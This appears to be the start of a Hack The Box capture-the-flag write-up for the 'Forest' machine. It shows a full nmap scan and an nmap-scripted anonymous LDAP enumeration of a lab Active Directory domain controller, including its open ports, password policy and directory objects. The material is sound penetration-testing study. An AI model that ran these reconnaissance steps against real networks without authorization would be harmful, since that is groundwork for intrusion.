**nmap enumration**

```
╭─ ~/Desktop/HackTheBox/Machines/Easy/forest ───────────── 1 ✘  at 14:09:00 
╰─ sudo nmap -sS -sC -sV -A -T4 -p- -v -oA nmap 10.129.215.16 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-04 14:09 PDT
NSE: Loaded 153 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 14:09
Completed NSE at 14:09, 0.00s elapsed
Initiating NSE at 14:09
Completed NSE at 14:09, 0.00s elapsed
Initiating NSE at 14:09
Completed NSE at 14:09, 0.00s elapsed
Initiating Ping Scan at 14:09f
Scanning 10.129.215.16 [4 ports]
Completed Ping Scan at 14:09, 0.19s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 14:09
Completed Parallel DNS resolution of 1 host. at 14:09, 0.00s elapsed
Initiating SYN Stealth Scan at 14:09
Scanning 10.129.215.16 [65535 ports]
Discovered open port 53/tcp on 10.129.215.16
Discovered open port 139/tcp on 10.129.215.16
Discovered open port 135/tcp on 10.129.215.16
Discovered open port 445/tcp on 10.129.215.16
Discovered open port 49665/tcp on 10.129.215.16
Increasing send delay for 10.129.215.16 from 0 to 5 due to 1309 out of 3271 dropped probes since last increase.
SYN Stealth Scan Timing: About 7.13% done; ETC: 14:16 (0:06:44 remaining)
Discovered open port 49681/tcp on 10.129.215.16
SYN Stealth Scan Timing: About 14.81% done; ETC: 14:16 (0:05:51 remaining)
Discovered open port 389/tcp on 10.129.215.16
Discovered open port 49666/tcp on 10.129.215.16
Discovered open port 49676/tcp on 10.129.215.16
Discovered open port 49664/tcp on 10.129.215.16
SYN Stealth Scan Timing: About 22.36% done; ETC: 14:15 (0:05:16 remaining)
SYN Stealth Scan Timing: About 29.51% done; ETC: 14:15 (0:04:49 remaining)
Discovered open port 9389/tcp on 10.129.215.16
Discovered open port 636/tcp on 10.129.215.16
SYN Stealth Scan Timing: About 36.65% done; ETC: 14:16 (0:04:21 remaining)
SYN Stealth Scan Timing: About 43.60% done; ETC: 14:16 (0:03:54 remaining)
Discovered open port 3268/tcp on 10.129.215.16
Discovered open port 49677/tcp on 10.129.215.16
SYN Stealth Scan Timing: About 51.27% done; ETC: 14:16 (0:03:21 remaining)
SYN Stealth Scan Timing: About 58.46% done; ETC: 14:16 (0:02:51 remaining)
Discovered open port 49667/tcp on 10.129.215.16
Discovered open port 464/tcp on 10.129.215.16
SYN Stealth Scan Timing: About 65.99% done; ETC: 14:16 (0:02:20 remaining)
Discovered open port 3269/tcp on 10.129.215.16
SYN Stealth Scan Timing: About 73.14% done; ETC: 14:16 (0:01:51 remaining)
Discovered open port 88/tcp on 10.129.215.16
Discovered open port 52903/tcp on 10.129.215.16
SYN Stealth Scan Timing: About 80.90% done; ETC: 14:15 (0:01:18 remaining)
Discovered open port 593/tcp on 10.129.215.16
SYN Stealth Scan Timing: About 88.33% done; ETC: 14:15 (0:00:48 remaining)
Discovered open port 47001/tcp on 10.129.215.16
Discovered open port 49671/tcp on 10.129.215.16
Discovered open port 5985/tcp on 10.129.215.16
Discovered open port 49699/tcp on 10.129.215.16
Completed SYN Stealth Scan at 14:15, 409.31s elapsed (65535 total ports)
Initiating Service scan at 14:15
Scanning 24 services on 10.129.215.16
Completed Service scan at 14:16, 56.06s elapsed (24 services on 1 host)
Initiating OS detection (try #1) against 10.129.215.16
Retrying OS detection (try #2) against 10.129.215.16
Retrying OS detection (try #3) against 10.129.215.16
Retrying OS detection (try #4) against 10.129.215.16
Retrying OS detection (try #5) against 10.129.215.16
Initiating Traceroute at 14:17
Completed Traceroute at 14:17, 0.15s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 14:17
Completed Parallel DNS resolution of 2 hosts. at 14:17, 0.01s elapsed
NSE: Script scanning 10.129.215.16.
Initiating NSE at 14:17
Completed NSE at 14:17, 11.79s elapsed
Initiating NSE at 14:17
Completed NSE at 14:17, 4.28s elapsed
Initiating NSE at 14:17
Completed NSE at 14:17, 0.00s elapsed
Nmap scan report for 10.129.215.16
Host is up (0.15s latency).
Not shown: 65511 closed ports
PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Simple DNS Plus
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2021-09-04 15:52:54Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49671/tcp open  msrpc        Microsoft Windows RPC
49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc        Microsoft Windows RPC
49681/tcp open  msrpc        Microsoft Windows RPC
49699/tcp open  msrpc        Microsoft Windows RPC
52903/tcp open  msrpc        Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=9/4%OT=53%CT=1%CU=36747%PV=Y%DS=2%DC=T%G=Y%TM=6133E262
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=109%TI=I%CI=I%II=I%SS=S%TS=A
OS:)OPS(O1=M54DNW8ST11%O2=M54DNW8ST11%O3=M54DNW8NNT11%O4=M54DNW8ST11%O5=M54
OS:DNW8ST11%O6=M54DST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=2000
OS:)ECN(R=Y%DF=Y%T=80%W=2000%O=M54DNW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+
OS:%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T
OS:=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0
OS:%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S
OS:=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R
OS:=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N
OS:%T=80%CD=Z)

Uptime guess: 0.020 days (since Sat Sep  4 13:49:14 2021)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=258 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -3h03m09s, deviation: 4h02m31s, median: -5h23m11s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2021-09-04T08:53:59-07:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2021-09-04T15:53:57
|_  start_date: 2021-09-04T15:26:20

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   147.68 ms 10.10.14.1
2   148.44 ms 10.129.215.16

NSE: Script Post-scanning.
Initiating NSE at 14:17
Completed NSE at 14:17, 0.00s elapsed
Initiating NSE at 14:17
Completed NSE at 14:17, 0.00s elapsed
Initiating NSE at 14:17
Completed NSE at 14:17, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 493.78 seconds
           Raw packets sent: 67788 (2.986MB) | Rcvd: 66061 (2.646MB)
╭─ ~/Desktop/HackTheBox/Machines/Easy/forest ────────────────────────────────────────────────────────────────────────────────────────── ✔  took 8m 14s  at 14:17:22 
╰─ ls
nmap.gnmap  nmap.nmap  nmap.xml
╭─ ~/Desktop/HackTheBox/Machines/Easy/forest ──────────────────────────────────────────────────────────────────────────────────────────────────────── ✔  at 14:18:38 
╰─ cat nmap.
cat: nmap.: No such file or directory
╭─ ~/Desktop/HackTheBox/Machines/Easy/forest ────────────────────────────────────────────────────────────────────────────────────────────────────── 1 ✘  at 14:18:40 
╰─ cat nmap.nmap 
# Nmap 7.91 scan initiated Sat Sep  4 14:09:09 2021 as: nmap -sS -sC -sV -A -T4 -p- -v -oA nmap 10.129.215.16
Increasing send delay for 10.129.215.16 from 0 to 5 due to 1309 out of 3271 dropped probes since last increase.
Nmap scan report for 10.129.215.16
Host is up (0.15s latency).
Not shown: 65511 closed ports
PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Simple DNS Plus
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2021-09-04 15:52:54Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49671/tcp open  msrpc        Microsoft Windows RPC
49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc        Microsoft Windows RPC
49681/tcp open  msrpc        Microsoft Windows RPC
49699/tcp open  msrpc        Microsoft Windows RPC
52903/tcp open  msrpc        Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=9/4%OT=53%CT=1%CU=36747%PV=Y%DS=2%DC=T%G=Y%TM=6133E262
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=109%TI=I%CI=I%II=I%SS=S%TS=A
OS:)OPS(O1=M54DNW8ST11%O2=M54DNW8ST11%O3=M54DNW8NNT11%O4=M54DNW8ST11%O5=M54
OS:DNW8ST11%O6=M54DST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=2000
OS:)ECN(R=Y%DF=Y%T=80%W=2000%O=M54DNW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+
OS:%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T
OS:=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0
OS:%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S
OS:=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R
OS:=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N
OS:%T=80%CD=Z)

Uptime guess: 0.020 days (since Sat Sep  4 13:49:14 2021)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=258 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -3h03m09s, deviation: 4h02m31s, median: -5h23m11s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2021-09-04T08:53:59-07:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2021-09-04T15:53:57
|_  start_date: 2021-09-04T15:26:20

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   147.68 ms 10.10.14.1
2   148.44 ms 10.129.215.16

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Sep  4 14:17:22 2021 -- 1 IP address (1 host up) scanned in 493.78 seconds
```
so, i got a few open ports when i browsed to the http ports i wasnt authorized to access them.

****automated ldap search using nmap****
lets try ldap search, imma do an automated ldap search using nmap.

```╭─ ~/Desktop/HackTheBox/Machines/Easy/forest ──────────────────────────────────────────────────────────────────────────────────────────────────────── ✔  at 14:18:42 
╰─ nmap -n -sV --script "ldap* and not brute" 10.129.215.16
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-04 14:23 PDT

╭─ ~/Desktop/HackTheBox/Machines/Easy/forest ────────────────────────────────────────────────────────────────────────────────────────── INT ✘  took 8s  at 14:23:18 
╰─ nmap -n -sV --script "ldap* and not brute" 10.129.215.16 -v
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-04 14:23 PDT
NSE: Loaded 48 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 14:23
Completed NSE at 14:23, 0.00s elapsed
Initiating NSE at 14:23
Completed NSE at 14:23, 0.00s elapsed
Initiating Ping Scan at 14:23
Scanning 10.129.215.16 [2 ports]
Completed Ping Scan at 14:23, 0.15s elapsed (1 total hosts)
Initiating Connect Scan at 14:23
Scanning 10.129.215.16 [1000 ports]
Discovered open port 53/tcp on 10.129.215.16
Discovered open port 139/tcp on 10.129.215.16
Discovered open port 135/tcp on 10.129.215.16
Discovered open port 445/tcp on 10.129.215.16
Increasing send delay for 10.129.215.16 from 0 to 5 due to 39 out of 128 dropped probes since last increase.
Discovered open port 3268/tcp on 10.129.215.16
Discovered open port 636/tcp on 10.129.215.16
Discovered open port 593/tcp on 10.129.215.16
Discovered open port 88/tcp on 10.129.215.16
Discovered open port 464/tcp on 10.129.215.16
Discovered open port 3269/tcp on 10.129.215.16
Discovered open port 389/tcp on 10.129.215.16
Completed Connect Scan at 14:23, 14.61s elapsed (1000 total ports)
Initiating Service scan at 14:23
Scanning 11 services on 10.129.215.16
Completed Service scan at 14:23, 14.61s elapsed (11 services on 1 host)
NSE: Script scanning 10.129.215.16.
Initiating NSE at 14:23
Completed NSE at 14:23, 1.77s elapsed
Initiating NSE at 14:23
Completed NSE at 14:23, 0.30s elapsed
Nmap scan report for 10.129.215.16
Host is up (0.15s latency).
Not shown: 989 closed ports
PORT     STATE SERVICE      VERSION
53/tcp   open  domain       Simple DNS Plus
88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2021-09-04 16:00:31Z)
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
| ldap-rootdse: 
| LDAP Results
|   <ROOT>
|       currentTime: 20210904160040.0Z
|       subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=htb,DC=local
|       dsServiceName: CN=NTDS Settings,CN=FOREST,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=htb,DC=local
|       namingContexts: DC=htb,DC=local
|       namingContexts: CN=Configuration,DC=htb,DC=local
|       namingContexts: CN=Schema,CN=Configuration,DC=htb,DC=local
|       namingContexts: DC=DomainDnsZones,DC=htb,DC=local
|       namingContexts: DC=ForestDnsZones,DC=htb,DC=local
|       defaultNamingContext: DC=htb,DC=local
|       schemaNamingContext: CN=Schema,CN=Configuration,DC=htb,DC=local
|       configurationNamingContext: CN=Configuration,DC=htb,DC=local
|       rootDomainNamingContext: DC=htb,DC=local
|       supportedControl: 1.2.840.113556.1.4.319
|       supportedControl: 1.2.840.113556.1.4.801
|       supportedControl: 1.2.840.113556.1.4.473
|       supportedControl: 1.2.840.113556.1.4.528
|       supportedControl: 1.2.840.113556.1.4.417
|       supportedControl: 1.2.840.113556.1.4.619
|       supportedControl: 1.2.840.113556.1.4.841
|       supportedControl: 1.2.840.113556.1.4.529
|       supportedControl: 1.2.840.113556.1.4.805
|       supportedControl: 1.2.840.113556.1.4.521
|       supportedControl: 1.2.840.113556.1.4.970
|       supportedControl: 1.2.840.113556.1.4.1338
|       supportedControl: 1.2.840.113556.1.4.474
|       supportedControl: 1.2.840.113556.1.4.1339
|       supportedControl: 1.2.840.113556.1.4.1340
|       supportedControl: 1.2.840.113556.1.4.1413
|       supportedControl: 2.16.840.1.113730.3.4.9
|       supportedControl: 2.16.840.1.113730.3.4.10
|       supportedControl: 1.2.840.113556.1.4.1504
|       supportedControl: 1.2.840.113556.1.4.1852
|       supportedControl: 1.2.840.113556.1.4.802
|       supportedControl: 1.2.840.113556.1.4.1907
|       supportedControl: 1.2.840.113556.1.4.1948
|       supportedControl: 1.2.840.113556.1.4.1974
|       supportedControl: 1.2.840.113556.1.4.1341
|       supportedControl: 1.2.840.113556.1.4.2026
|       supportedControl: 1.2.840.113556.1.4.2064
|       supportedControl: 1.2.840.113556.1.4.2065
|       supportedControl: 1.2.840.113556.1.4.2066
|       supportedControl: 1.2.840.113556.1.4.2090
|       supportedControl: 1.2.840.113556.1.4.2205
|       supportedControl: 1.2.840.113556.1.4.2204
|       supportedControl: 1.2.840.113556.1.4.2206
|       supportedControl: 1.2.840.113556.1.4.2211
|       supportedControl: 1.2.840.113556.1.4.2239
|       supportedControl: 1.2.840.113556.1.4.2255
|       supportedControl: 1.2.840.113556.1.4.2256
|       supportedControl: 1.2.840.113556.1.4.2309
|       supportedLDAPVersion: 3
|       supportedLDAPVersion: 2
|       supportedLDAPPolicies: MaxPoolThreads
|       supportedLDAPPolicies: MaxPercentDirSyncRequests
|       supportedLDAPPolicies: MaxDatagramRecv
|       supportedLDAPPolicies: MaxReceiveBuffer
|       supportedLDAPPolicies: InitRecvTimeout
|       supportedLDAPPolicies: MaxConnections
|       supportedLDAPPolicies: MaxConnIdleTime
|       supportedLDAPPolicies: MaxPageSize
|       supportedLDAPPolicies: MaxBatchReturnMessages
|       supportedLDAPPolicies: MaxQueryDuration
|       supportedLDAPPolicies: MaxDirSyncDuration
|       supportedLDAPPolicies: MaxTempTableSize
|       supportedLDAPPolicies: MaxResultSetSize
|       supportedLDAPPolicies: MinResultSets
|       supportedLDAPPolicies: MaxResultSetsPerConn
|       supportedLDAPPolicies: MaxNotificationPerConn
|       supportedLDAPPolicies: MaxValRange
|       supportedLDAPPolicies: MaxValRangeTransitive
|       supportedLDAPPolicies: ThreadMemoryLimit
|       supportedLDAPPolicies: SystemMemoryLimitPercent
|       highestCommittedUSN: 1042676
|       supportedSASLMechanisms: GSSAPI
|       supportedSASLMechanisms: GSS-SPNEGO
|       supportedSASLMechanisms: EXTERNAL
|       supportedSASLMechanisms: DIGEST-MD5
|       dnsHostName: FOREST.htb.local
|       ldapServiceName: htb.local:forest$@HTB.LOCAL
|       serverName: CN=FOREST,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=htb,DC=local
|       supportedCapabilities: 1.2.840.113556.1.4.800
|       supportedCapabilities: 1.2.840.113556.1.4.1670
|       supportedCapabilities: 1.2.840.113556.1.4.1791
|       supportedCapabilities: 1.2.840.113556.1.4.1935
|       supportedCapabilities: 1.2.840.113556.1.4.2080
|       supportedCapabilities: 1.2.840.113556.1.4.2237
|       isSynchronized: TRUE
|       isGlobalCatalogReady: TRUE
|       domainFunctionality: 7
|       forestFunctionality: 7
|_      domainControllerFunctionality: 7
| ldap-search: 
|   Context: DC=htb,DC=local
|     dn: DC=htb,DC=local
|         objectClass: top
|         objectClass: domain
|         objectClass: domainDNS
|         distinguishedName: DC=htb,DC=local
|         instanceType: 5
|         whenCreated: 2019/09/18 17:45:49 UTC
|         whenChanged: 2021/09/04 15:26:10 UTC
|         subRefs: DC=ForestDnsZones,DC=htb,DC=local
|         subRefs: DC=DomainDnsZones,DC=htb,DC=local
|         subRefs: CN=Configuration,DC=htb,DC=local
|         uSNCreated: 4099
|         dSASignature: \x01\x00\x00\x00(\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00:\xA3k#YyAJ\xB9Y_\x82h\x9A\x08q
|         uSNChanged: 929834
|         name: htb
|         objectGUID: dff0c71a-49a9-264b-8c7b-52e3e2cb6eab
|         replUpToDateVector: \x02\x00\x00\x00\x00\x00\x00\x00\x12\x00\x00\x00\x00\x00\x00\x00\x80+\xBA\x07\xA0+|B\x8E\x91\xB7\x8C\xE2\xAFM\x9B
|         \x00\x00\x00\x00\x00\xD4\xBD>\x17\x03\x00\x00\x00i\xB5Y\x1F\xFA\x8B\xA9G\xB3\xB0R.\xA0\xD4b\xEC\x16P\x03\x00\x00\x00\x00\x00\x01\xD5\xAA\x13\x03\x00\x00\x00:\xA3k#YyAJ\xB9Y_\x82h\x9A\x08q\x05\xA0\x00\x00\x00\x00\x00\x00_!\x99\x13\x03\x00\x00\x00\xE7\x9D\x16,\x14\xD0\xD9K\xA1\xA3\x02\xD0?\xC08K 0\x0E\x00\x00\x00\x00\x00\x11!D\x17\x03\x00\x00\x00\xFD!?9\xEE\x966L\xB0C\xBC\x0Fp\x8Du\xBA\x19\x10\x04\x00\x00\x00\x00\x00n\xC9=\x17\x03\x00\x00\x00\x10<\x01A\xB4\x8C\x9DE\x88\xE2z\xBC\x05\x8E\xE3\xD7\x150\x03\x00\x00\x00\x00\x00\xD5\xD7\xA6\x13\x03\x00\x00\x00\xB50\xC6a\xA2A\xB0E\xB14A\x1A\xB5N1c\x08\xD0\x00\x00\x00\x00\x00\x00\x9F=\x99\x13\x03\x00\x00\x00N|cxf\x16\xECI\xAB\x9C\xCDQ\xEE`H\x81\x13p\x02\x00\x00\x00\x00\x00\xDDm\xA0\x13\x03\x00\x00\x001\xF4\xC6\x8BEpyC\xA6\x9B\x99\xF2\xB4\x8D&p\x0C\x10\x01\x00\x00\x00\x00\x00\x86\xC5\x99\x13\x03\x00\x00\x00\xB7\x02\xFE\x8F
|         \x00\x00\x00\x00\x00\x99\xC5>\x17\x03\x00\x00\x00\x12\xE3\xA9\xF1\xC0\xBA\xB7O\xAEj\x87\xBC\xDE:\xA7-\x07\xC0\x00\x00\x00\x00\x00\x00\xC37\x99\x13\x03\x00\x00\x00\x9E\xBD\x80\xF9D\x13\xFBE\xBA\xD8\x01
|         \xE0\x8E\x1B\x8F\x1C\xD0\x0C\x00\x00\x00\x00\x00\xB1\xAF>\x17\x03\x00\x00\x00
|         creationTime: 132752427708520782
|         forceLogoff: -9223372036854775808
|         lockoutDuration: -18000000000
|         lockOutObservationWindow: -18000000000
|         lockoutThreshold: 0
|         maxPwdAge: -9223372036854775808
|         minPwdAge: -864000000000
|         minPwdLength: 7
|         modifiedCountAtLastProm: 0
|         nextRid: 1000
|         pwdProperties: 0
|         pwdHistoryLength: 24
|         objectSid: 1-5-21-3072663084-364016917-1341370565
|         serverState: 1
|         uASCompat: 1
|         modifiedCount: 1
|         auditingPolicy: \x00\x01
|         nTMixedDomain: 0
|         rIDManagerReference: CN=RID Manager$,CN=System,DC=htb,DC=local
|         fSMORoleOwner: CN=NTDS Settings,CN=FOREST,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=htb,DC=local
|         systemFlags: -1946157056
|         wellKnownObjects: B:32:6227F0AF1FC2410D8E3BB10615BB5B0F:CN=NTDS Quotas,DC=htb,DC=local
|         wellKnownObjects: B:32:F4BE92A4C777485E878E9421D53087DB:CN=Microsoft,CN=Program Data,DC=htb,DC=local
|         wellKnownObjects: B:32:09460C08AE1E4A4EA0F64AEE7DAA1E5A:CN=Program Data,DC=htb,DC=local
|         wellKnownObjects: B:32:22B70C67D56E4EFB91E9300FCA3DC1AA:CN=ForeignSecurityPrincipals,DC=htb,DC=local
|         wellKnownObjects: B:32:18E2EA80684F11D2B9AA00C04F79F805:CN=Deleted Objects,DC=htb,DC=local
|         wellKnownObjects: B:32:2FBAC1870ADE11D297C400C04FD8D5CD:CN=Infrastructure,DC=htb,DC=local
|         wellKnownObjects: B:32:AB8153B7768811D1ADED00C04FD8D5CD:CN=LostAndFound,DC=htb,DC=local
|         wellKnownObjects: B:32:AB1D30F3768811D1ADED00C04FD8D5CD:CN=System,DC=htb,DC=local
|         wellKnownObjects: B:32:A361B2FFFFD211D1AA4B00C04FD7D83A:OU=Domain Controllers,DC=htb,DC=local
|         wellKnownObjects: B:32:AA312825768811D1ADED00C04FD8D5CD:CN=Computers,DC=htb,DC=local
|         wellKnownObjects: B:32:A9D1CA15768811D1ADED00C04FD8D5CD:CN=Users,DC=htb,DC=local
|         objectCategory: CN=Domain-DNS,CN=Schema,CN=Configuration,DC=htb,DC=local
|         isCriticalSystemObject: TRUE
|         gPLink: [LDAP://CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=htb,DC=local;0]
|         dSCorePropagationData: 1601/01/01 00:00:00 UTC
|         otherWellKnownObjects: B:32:683A24E2E8164BD3AF86AC3C2CF3F981:CN=Keys,DC=htb,DC=local
|         otherWellKnownObjects: B:32:1EB93889E40C45DF9F0C64D23BBB6237:CN=Managed Service Accounts,DC=htb,DC=local
|         masteredBy: CN=NTDS Settings,CN=FOREST,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=htb,DC=local
|         ms-DS-MachineAccountQuota: 10
|         msDS-Behavior-Version: 7
|         msDS-PerUserTrustQuota: 1
|         msDS-AllUsersTrustQuota: 1000
|         msDS-PerUserTrustTombstonesQuota: 10
|         msDs-masteredBy: CN=NTDS Settings,CN=FOREST,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=htb,DC=local
|         msDS-IsDomainFor: CN=NTDS Settings,CN=FOREST,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=htb,DC=local
|         msDS-NcType: 0
|         msDS-ExpirePasswordsOnSmartCardOnlyAccounts: TRUE
|         dc: htb
|     dn: CN=Users,DC=htb,DC=local
|         objectClass: top
|         objectClass: container
|         cn: Users
|         description: Default container for upgraded user accounts
|         distinguishedName: CN=Users,DC=htb,DC=local
|         instanceType: 4
|         whenCreated: 2019/09/18 17:45:57 UTC
|         whenChanged: 2019/09/23 22:51:14 UTC
|         uSNCreated: 5888
|         uSNChanged: 94253
|         showInAdvancedViewOnly: FALSE
|         name: Users
|         objectGUID: 28cbed1a-9b7f-1e49-9fce-a053e95892cd
|         systemFlags: -1946157056
|         objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=htb,DC=local
|         isCriticalSystemObject: TRUE
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 1601/01/01 00:00:00 UTC
|     dn: CN=Allowed RODC Password Replication Group,CN=Users,DC=htb,DC=local
|         objectClass: top
|         objectClass: group
|         cn: Allowed RODC Password Replication Group
|         description: Members in this group can have their passwords replicated to all read-only domain controllers in the domain
|         distinguishedName: CN=Allowed RODC Password Replication Group,CN=Users,DC=htb,DC=local
|         instanceType: 4
|         whenCreated: 2019/09/18 10:53:23 UTC
|         whenChanged: 2019/09/18 10:53:23 UTC
|         uSNCreated: 12402
|         uSNChanged: 12404
|         name: Allowed RODC Password Replication Group
|         objectGUID: 749868e0-3a64-c04d-9924-5bf97cfbd368
|         objectSid: 1-5-21-3072663084-364016917-1341370565-571
|         sAMAccountName: Allowed RODC Password Replication Group
|         sAMAccountType: 536870912
|         groupType: -2147483644
|         objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=htb,DC=local
|         isCriticalSystemObject: TRUE
